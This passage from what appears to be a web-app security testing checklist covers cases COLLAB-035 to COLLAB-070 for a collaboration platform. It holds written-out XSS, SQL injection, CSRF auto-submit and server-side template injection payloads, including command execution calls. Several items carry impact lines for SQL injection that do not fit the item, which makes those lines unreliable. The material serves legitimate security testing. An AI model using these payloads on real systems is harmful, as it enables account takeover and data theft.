**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-035 — Comment Rate Limiting Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Post comments in rapid succession. 2. Check if rate limiting is enforced on comment creation. 3. Attempt to flood the comment section with spam. 4. Test with different authentication tokens.

**Expected Result:** Application must implement rate limiting on comment creation to prevent spam and abuse.

**Payload Example:**

```
Send 100+ POST /api/comments requests per minute;bypass with X-Forwarded-For header rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COLLAB-036 — CSRF on Comment Submission
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Craft a malicious page that auto-submits a comment on the victim's behalf. 2. Include misleading or offensive content. 3. Lure victim to visit while authenticated. 4. Check if comment is posted.

**Expected Result:** Application must validate CSRF tokens on all comment submission requests.

**Payload Example:**

```
<form action='https://target.com/api/documents/DOC-1001/comments' method='POST'><input name='body' value='Inappropriate content posted by victim'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-037 — Markdown/HTML Injection in Comments
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. If comments support Markdown inject malicious Markdown. 2. Test for HTML injection via Markdown rendering. 3. Test for link injection and image injection. 4. Check for JavaScript execution via Markdown.

**Expected Result:** Application must safely render Markdown in comments and prevent HTML injection or JavaScript execution through Markdown processing.

**Payload Example:**

````
comment=[Click here](javascript:alert(1));![img](x" onerror="alert(1));[link](https://evil.com);```<script>alert(1)</script>```
````

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-038 — XSS via @Mention Username
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Change username to include XSS payload. 2. Mention this user in a comment or document using @mention. 3. Check if the XSS payload executes when the mention is rendered. 4. Test in notification popup.

**Expected Result:** Application must sanitize and encode all usernames when rendering @mentions in any context including notifications.

**Payload Example:**

```
Set username to <script>alert(1)</script> then have another user type @<script>alert(1)</script> in a comment
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-039 — @Mention User Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Type @ in the mention field. 2. Check if users from other workspaces appear in suggestions. 3. Test with partial names to enumerate users. 4. Check if the mention autocomplete reveals email addresses.

**Expected Result:** Application must restrict @mention suggestions to users within the current workspace and not expose users from other workspaces.

**Payload Example:**

```
Type @a;@b;@admin in mention field and check if cross-workspace users appear;check for email in suggestion response
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COLLAB-040 — @Mention Notification IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Mention a user in a comment. 2. Intercept the notification request. 3. Change the mentioned_user_id to a user outside the workspace. 4. Check if the external user receives notification with workspace content.

**Expected Result:** Application must verify that mentioned users are members of the workspace before sending notifications with workspace content.

**Payload Example:**

```
Change mentioned_user_id in POST /api/mentions to user outside workspace;check notification delivery to unauthorized user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-041 — @Mention Spam and Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Mention many users in a single comment. 2. Mention the same user hundreds of times. 3. Check for rate limiting on mentions. 4. Test for notification flooding via mass mentions.

**Expected Result:** Application must limit the number of @mentions per comment and rate limit mention-triggered notifications.

**Payload Example:**

```
Post comment with 100+ @mentions;mention same user 50 times;send rapid comments each with mentions
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COLLAB-042 — SQL Injection via @Mention Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Type @ followed by SQL injection payload in the mention search. 2. Observe autocomplete API responses for SQL errors. 3. Test for data extraction via mention autocomplete.

**Expected Result:** Application must use parameterized queries for @mention user search autocomplete.

**Payload Example:**

```
Type @' OR 1=1-- in mention field;GET /api/mentions/search?q=' UNION SELECT email;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-043 — @Mention Notification Content Injection
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. Mention a user in a comment containing injection payloads. 2. Check if the notification email or push notification contains unencoded payload. 3. Test for XSS in notification rendering.

**Expected Result:** Application must sanitize all content in @mention notifications before rendering in email or push or in-app notification.

**Payload Example:**

```
Comment: @user check this <script>alert(document.cookie)</script>;check if notification renders XSS in email or popup
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;XSS Hunter;Email Client

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-044 — IDOR on Task Assignment
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Create a task and assign it to a team member. 2. Intercept and change task_id to a task in another workspace. 3. Attempt to reassign tasks in other workspaces. 4. Check for cross-workspace task manipulation.

**Expected Result:** Application must verify workspace membership and task ownership before allowing task assignment or reassignment.

**Payload Example:**

```
PUT /api/tasks/TASK-2001/assign with assignee_id from own workspace but targeting another workspace's task
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-045 — Unauthorized Task Reassignment
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Login as a regular team member without assignment privileges. 2. Attempt to reassign tasks via API. 3. Modify the assignee to a user outside the workspace. 4. Check if role restrictions are enforced.

**Expected Result:** Application must restrict task assignment to authorized roles and validate that assignees are workspace members.

**Payload Example:**

```
PUT /api/tasks/TASK-1001/assign with regular member token;set assignee_id to external user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-046 — Task Assignment XSS via Task Title
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Create a task with XSS payload in the title and description. 2. Assign it to another user. 3. Check if the payload executes when the assignee views the task or receives notification.

**Expected Result:** Application must sanitize all task fields and encode output when rendering tasks in lists and details and notifications.

**Payload Example:**

```
task_title=<script>alert(document.cookie)</script>;task_description=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-047 — Task Assignment to Deactivated User
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Assign a task to an active user. 2. Deactivate the user. 3. Check if the task assignment remains. 4. Attempt to assign new tasks to the deactivated user. 5. Verify task reassignment workflow.

**Expected Result:** Application must prevent task assignment to deactivated users and handle existing assignments during deactivation.

**Payload Example:**

```
POST /api/tasks/assign with assignee_id pointing to deactivated user account
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-048 — CSRF on Task Assignment
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Craft a malicious page that reassigns victim's tasks to the attacker. 2. Lure the workspace admin to visit. 3. Check if tasks are reassigned without CSRF token validation.

**Expected Result:** Application must validate CSRF tokens on all task assignment and reassignment operations.

**Payload Example:**

```
<script>fetch('/api/tasks/TASK-1001/assign',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"assignee_id":"attacker_id"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-049 — Task Assignment Notification Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Assign a task and intercept the notification trigger. 2. Modify the assigner_id to impersonate a manager. 3. Check if the notification appears to come from the impersonated user.

**Expected Result:** Application must determine the assigner from the authenticated session and not accept client-provided assigner identifiers.

**Payload Example:**

```
Modify assigner_id=MANAGER_ID in task assignment notification request;spoof assignment source
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-050 — Mass Assignment on Task Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Create or update a task. 2. Add hidden parameters like is_approved=true or priority=critical or budget=unlimited. 3. Check if unauthorized fields are accepted and processed.

**Expected Result:** Application must whitelist allowed task fields for creation and update and ignore any unauthorized parameters.

**Payload Example:**

```
Add is_approved=true&priority=critical&budget=999999&bypass_workflow=true to task creation request
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## COLLAB-051 — IDOR on Project Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Access own project details. 2. Change project_id to access projects in other workspaces. 3. Enumerate project IDs. 4. Check if confidential project data is exposed to unauthorized users.

**Expected Result:** Application must verify workspace membership and project access permissions before displaying any project data.

**Payload Example:**

```
GET /api/projects/PROJ-2001 with non-member credentials;enumerate PROJ-0001 through PROJ-9999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-052 — Project Settings Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Login as a project viewer or contributor. 2. Attempt to modify project settings via API. 3. Change project visibility from private to public. 4. Modify budget or timeline settings.

**Expected Result:** Application must enforce role-based access on project settings and restrict modifications to project managers and admins.

**Payload Example:**

```
PUT /api/projects/PROJ-1001/settings with contributor credentials;change visibility=private to visibility=public
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-053 — SQL Injection in Project Filters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Filter projects by status or date or owner. 2. Inject SQL payloads in filter parameters. 3. Test with UNION-based and blind injection. 4. Observe responses for data leakage.

**Expected Result:** Application must use parameterized queries for all project listing and filtering operations.

**Payload Example:**

```
GET /api/projects?status=' OR 1=1--;GET /api/projects?owner=test' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-054 — Project Deletion Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. As a project viewer attempt to delete the project. 2. Access admin deletion endpoints with regular credentials. 3. Check if deletion confirmation is required. 4. Verify role enforcement.

**Expected Result:** Application must restrict project deletion to project owners or workspace admins with mandatory confirmation.

**Payload Example:**

```
DELETE /api/projects/PROJ-1001 with viewer credentials;bypass confirmation by direct API call
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-055 — XSS in Project Name and Metadata
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Create a project with XSS payloads in name and description and tags. 2. View the project listing and detail pages. 3. Check if payloads execute for other workspace members.

**Expected Result:** Application must sanitize all project metadata fields and encode output when rendering project information.

**Payload Example:**

```
project_name=<svg/onload=alert(1)>;project_tags=["<script>alert(1)</script>"];project_description=<img/src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-056 — Project Template Injection
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. If project templates support dynamic content inject SSTI payloads. 2. Create a project from the injected template. 3. Check if template engine evaluates the expression.

**Expected Result:** Application must treat project template content as static and not process template syntax from user-provided data.

**Payload Example:**

```
template_content={{7*7}};template_body=${Runtime.getRuntime().exec('id')};template=<%= system('whoami') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COLLAB-057 — Project Export Data Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Export project data. 2. Check if export includes data from related projects the user should not access. 3. Verify data scope in export. 4. Check for sensitive information in export.

**Expected Result:** Application must scope project exports to the user's authorized data and exclude any cross-project or confidential information.

**Payload Example:**

```
GET /api/projects/PROJ-1001/export and check for cross-project data;internal_notes;member_personal_details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-058 — IDOR on Kanban Board Card Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. Access cards on own Kanban board. 2. Change card_id to access cards from another workspace's board. 3. Enumerate card IDs. 4. Check for cross-workspace card data leakage.

**Expected Result:** Application must verify board and workspace membership before displaying any Kanban card data.

**Payload Example:**

```
GET /api/boards/BOARD-2001/cards;GET /api/cards/CARD-2001 with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-059 — Unauthorized Card Movement Between Columns
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. Login as a board viewer without edit permissions. 2. Attempt to move a card between columns via API. 3. Modify card status directly. 4. Check if column transition rules are enforced.

**Expected Result:** Application must enforce column transition rules and role-based permissions on card movements within the Kanban board.

**Payload Example:**

```
PUT /api/cards/CARD-1001/move with column=done using viewer credentials;bypass workflow rules via direct status change
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-060 — XSS in Kanban Card Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. Create a Kanban card with XSS payload in title and description and labels. 2. View the board. 3. Check if the payload executes when other board members view the card or board.

**Expected Result:** Application must sanitize all Kanban card content and encode output when rendering cards on the board.

**Payload Example:**

```
card_title=<script>alert(document.cookie)</script>;card_label=<img src=x onerror=alert(1)>;card_description=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-061 — Kanban Board Drag-and-Drop WebSocket Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. If Kanban board uses WebSocket for real-time updates intercept drag-and-drop messages. 2. Inject malicious payloads in position update messages. 3. Attempt to move other users' cards.

**Expected Result:** Application must validate all Kanban board WebSocket messages server-side and verify user permissions for card movements.

**Payload Example:**

```
Send {"action":"move",card_id:"CARD-2001",column:"done",position:0} via WebSocket for card user cannot access
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-062 — Kanban Board Column Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. Create custom columns on the board. 2. Inject column names with special characters or XSS. 3. Create columns with duplicate names. 4. Delete columns with cards in them. 5. Check for data loss.

**Expected Result:** Application must validate column operations and handle edge cases like deletion of non-empty columns safely without data loss.

**Payload Example:**

```
Create column with name=<script>alert(1)</script>;delete non-empty column;create duplicate column names
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-063 — Kanban Board Card Limit Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. If WIP (Work in Progress) limits are set on columns add more cards than the limit. 2. Bypass frontend enforcement via API. 3. Check if server validates WIP limits.

**Expected Result:** Application must enforce WIP limits server-side and reject card additions to columns that have reached their limit.

**Payload Example:**

```
POST /api/boards/BOARD-1001/columns/COL-1001/cards when WIP limit is reached;bypass via direct API call
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-064 — IDOR on Gantt Chart Data Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Access Gantt chart data for own project. 2. Change project_id to access another workspace's Gantt chart. 3. Check if timeline and dependency data is exposed.

**Expected Result:** Application must verify project and workspace membership before displaying Gantt chart data.

**Payload Example:**

```
GET /api/projects/PROJ-2001/gantt with non-member credentials;change project context in Gantt view
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-065 — Gantt Chart Date Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Modify task dates on the Gantt chart via API. 2. Set start dates after end dates. 3. Create circular dependencies. 4. Set unrealistic date ranges. 5. Check server-side validation.

**Expected Result:** Application must validate all Gantt chart date modifications including dependency consistency and logical date ordering.

**Payload Example:**

```
Set start_date=2026-01-01 and end_date=2025-01-01;create circular dependency A->B->C->A;set duration to negative value
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-066 — XSS in Gantt Chart Task Labels
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Create tasks with XSS payloads in task names displayed on the Gantt chart. 2. View the chart. 3. Check if tooltips or labels execute the payload. 4. Test in exported Gantt views.

**Expected Result:** Application must sanitize all task data rendered in the Gantt chart including tooltips and labels and exported views.

**Payload Example:**

```
task_name=<script>alert(1)</script>;milestone_name=<img src=x onerror=alert(1)> displayed on Gantt chart
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-067 — Unauthorized Gantt Chart Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Login as a project viewer. 2. Attempt to modify Gantt chart elements like dates and dependencies and milestones. 3. Check if modification is restricted to editors and managers.

**Expected Result:** Application must enforce role-based access on Gantt chart modifications restricting changes to authorized roles.

**Payload Example:**

```
PUT /api/projects/PROJ-1001/gantt/tasks/TASK-1001 with viewer credentials;modify dependencies via API
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-068 — Gantt Chart Export Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Export Gantt chart data. 2. Check if export includes confidential information like budget and resource costs and internal notes. 3. Verify data minimization in exports.

**Expected Result:** Gantt chart exports must contain only authorized data appropriate for the exporting user's access level.

**Payload Example:**

```
GET /api/projects/PROJ-1001/gantt/export and check for resource_cost;budget;internal_deadlines;confidential_notes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-069 — IDOR on Time Entry Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. View own time tracking entries. 2. Change user_id or entry_id to access other users' time entries. 3. Check if other team members' work hours and rates are exposed.

**Expected Result:** Application must verify ownership and access permissions before displaying time tracking entries.

**Payload Example:**

```
GET /api/time-entries?user_id=1002;GET /api/time-entries/ENTRY-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-070 — Time Entry Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

